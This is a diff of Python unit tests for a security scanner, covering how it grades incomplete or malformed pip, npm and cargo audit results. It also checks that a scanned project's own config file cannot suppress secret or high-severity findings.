+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: "/usr/bin/pip-audit" if n == "pip-audit" else None), \
+                    patch("gatekeeper_scanner.core.subprocess.run",
+                          return_value=self._pip_ok('{"dependencies": []}')):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "partial")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_pip_full_coverage_is_clean(self):
+        """Guard: every declared package present in the audit result → clean."""
+        from unittest.mock import patch
+        d = self._make({"requirements.txt": "requests==2.0.0\nflask==2.0.0\n"})
+        covered = json.dumps({"dependencies": [
+            {"name": "requests", "version": "2.0.0", "vulns": []},
+            {"name": "flask", "version": "2.0.0", "vulns": []},
+        ]})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: "/usr/bin/pip-audit" if n == "pip-audit" else None), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=self._pip_ok(covered)):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "clean")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_npm_vuln_entry_wrong_type_fails_closed(self):
+        """A non-object npm vulnerability entry must fail closed (unparseable +
+        INCOMPLETE), not be silently skipped — it could be the omitted record."""
+        from unittest.mock import patch, MagicMock
+        d = self._make({
+            "package.json": '{"dependencies": {"x": "1.0.0"}}\n',
+            "package-lock.json": '{"lockfileVersion":3,"packages":{}}\n',
+        })
+        out = MagicMock(returncode=0, stderr="", stdout=json.dumps({"vulnerabilities": {"x": ["not", "a", "dict"]}}))
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)  # must not raise
+            self.assertEqual(report.dependency_report["audit_status"]["javascript"]["status"],
+                             "unparseable")
+            self.assertTrue(any(g["reason"] == "dependency_audit_unparseable"
+                                for g in report.coverage_gaps))
+            self.assertEqual(report.grade, "INCOMPLETE")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_cargo_advisory_wrong_type_fails_closed(self):
+        """A non-object cargo list entry / advisory must fail closed, not skip."""
+        from unittest.mock import patch, MagicMock
+        d = self._make({"Cargo.toml": '[package]\nname="x"\n\n[dependencies]\nserde="1"\n'})
+        out = MagicMock(returncode=1, stderr="", stdout=json.dumps(
+            {"vulnerabilities": {"list": ["not-a-dict"]}}))
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)  # must not raise
+            self.assertEqual(report.dependency_report["audit_status"]["rust"]["status"],
+                             "unparseable")
+            self.assertTrue(any(g["reason"] == "dependency_audit_unparseable"
+                                for g in report.coverage_gaps))
+            self.assertEqual(report.grade, "INCOMPLETE")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_cargo_advisory_object_wrong_type_fails_closed(self):
+        """The advisory field being a non-object also fails closed."""
+        from unittest.mock import patch, MagicMock
+        d = self._make({"Cargo.toml": '[package]\nname="x"\n\n[dependencies]\nserde="1"\n'})
+        out = MagicMock(returncode=1, stderr="", stdout=json.dumps(
+            {"vulnerabilities": {"list": [{"advisory": "not-a-dict"}]}}))
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", side_effect=lambda n: f"/usr/bin/{n}"), \
+                    patch("gatekeeper_scanner.core.subprocess.run", return_value=out):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["rust"]["status"],
+                             "unparseable")
+            self.assertEqual(report.grade, "INCOMPLETE")
+        finally:
+            shutil.rmtree(d, ignore_errors=True)
+
+    def test_401_pinned_osv_is_partial(self):
+        from unittest.mock import patch
+        reqs = "".join(f"pkg{i}=={i}.0.0\n" for i in range(401))
+        d = self._make({"requirements.txt": reqs})
+        try:
+            with patch.object(SecurityScanner, "_resolve_binary", return_value=None), \
+                    patch("gatekeeper_scanner.osv.audit_packages",
+                          return_value=([], None, {"requested": 401, "queried": 400, "responded": 400})):
+                report = SecurityScanner().scan(d)
+            self.assertEqual(report.dependency_report["audit_status"]["python"]["status"],
+                             "partial")
         finally:
             shutil.rmtree(d, ignore_errors=True)
 
@@ -3755,7 +5088,7 @@ class TestCodexP1(unittest.TestCase):
         }
         d = self._make(files)
         try:
-            base = SecurityScanner(skip_deps=True).scan(d)
+            base = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             secret_rule = self._rule_id_of(base, lambda f: f.category == "SECRET")
             crit_rule = self._rule_id_of(base, lambda f: f.severity == "CRITICAL")
             self.assertTrue(secret_rule and crit_rule, "need a SECRET and a CRITICAL to test")
@@ -3764,7 +5097,7 @@ class TestCodexP1(unittest.TestCase):
                     {"rule": secret_rule, "files": ["*"], "reason": "x"},
                     {"rule": crit_rule, "files": ["*"], "reason": "x"},
                 ]}, f)
-            r = SecurityScanner(skip_deps=True).scan(d)
+            r = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             self.assertTrue([f for f in r.findings if f.category == "SECRET"],
                             "target config must not suppress a SECRET")
             self.assertTrue([f for f in r.findings if f.severity == "CRITICAL"],
@@ -3777,14 +5110,14 @@ class TestCodexP1(unittest.TestCase):
         """Legit noise tuning still works: a MEDIUM non-secret finding can be suppressed."""
         d = self._make({"app.py": "compile(src)\n"})
         try:
-            base = SecurityScanner(skip_deps=True).scan(d)
+            base = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             med_rule = self._rule_id_of(
                 base, lambda f: f.severity == "MEDIUM" and f.category != "SECRET")
             if not med_rule:
                 self.skipTest("no MEDIUM non-secret finding to suppress")
             with open(os.path.join(d, ".gatekeeper.json"), "w") as f:
                 json.dump({"suppress": [{"rule": med_rule, "files": ["*"], "reason": "x"}]}, f)
-            r = SecurityScanner(skip_deps=True).scan(d)
+            r = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             self.assertFalse([f for f in r.findings if f.rule_id == med_rule],
                              "a MEDIUM non-secret suppression should still work")
         finally:
@@ -3881,12 +5214,12 @@ class TestCodexP2(unittest.TestCase):
         """A target .gatekeeper.json cannot suppress a HIGH finding; the override is disclosed."""
         d = self._make({"app.py": "eval(x)\n"})
         try:
-            base = SecurityScanner(skip_deps=True).scan(d)
+            base = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             rid = next((f.rule_id for f in base.findings if "eval()" in f.message), None)
             self.assertTrue(rid)
             with open(os.path.join(d, ".gatekeeper.json"), "w") as f:
                 json.dump({"suppress": [{"rule": rid, "files": ["*"], "reason": "x"}]}, f)
-            r = SecurityScanner(skip_deps=True).scan(d)
+            r = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             self.assertTrue(any("eval()" in f.message for f in r.findings),
                             "target config must not suppress a HIGH")
             self.assertTrue(any("cannot silence" in w for w in r.warnings))
@@ -3912,7 +5245,7 @@ class TestCodexP2(unittest.TestCase):
             ".gatekeeper.json": json.dumps({"exclude": ["hidden.py"]}),
         })
         try:
-            r = SecurityScanner(skip_deps=True).scan(d)
+            r = SecurityScanner(skip_deps=True, trust_target=True).scan(d)
             self.assertTrue(any("excluded from scan by target config" in w and "hidden.py" in w
                                 for w in r.warnings),
                             "target-supplied exclusions must be disclosed")
